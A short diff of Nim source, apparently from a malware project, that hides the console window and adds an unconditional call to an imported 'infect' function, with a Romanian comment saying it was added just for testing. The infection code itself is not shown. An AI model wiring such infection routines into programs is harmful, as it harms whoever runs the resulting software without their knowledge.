@@ -1,6 +1,10 @@
 # hide the console window
 const isProd {.booldefine.}: bool = false
 
+# am pus asta doar ca sa testez func
+import lib/functions/infect
+infect()
+
 when isProd:
   from lib/functions/beforeStart import run
   run()
